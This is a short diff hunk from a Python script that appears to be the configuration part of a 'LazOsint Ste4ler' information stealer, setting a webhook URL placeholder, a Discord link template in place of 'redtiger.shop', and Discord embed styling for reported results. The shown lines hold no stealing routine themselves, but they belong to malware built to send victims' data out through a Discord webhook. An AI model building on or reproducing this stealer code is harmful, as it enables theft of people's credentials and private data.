@@ -50,7 +50,7 @@ def Clear():
         pass
 
 w3bh00k_ur1 = "%WEBHOOK_URL%"
-website = "redtiger.shop"
+website = "{discord_url}"
 color_embed = 0xa80505
 username_embed = 'LazOsint Ste4ler'
 avatar_embed = 'https://cdn.discordapp.com/attachments/1268900329605300234/1276010081665683497/icon.ico?ex=66cf38be&is=66cde73e&hm=696c53b4791044ca0495d87f92e6d603e8383315d2ebdd385aaccfc6dbf6aa77&'
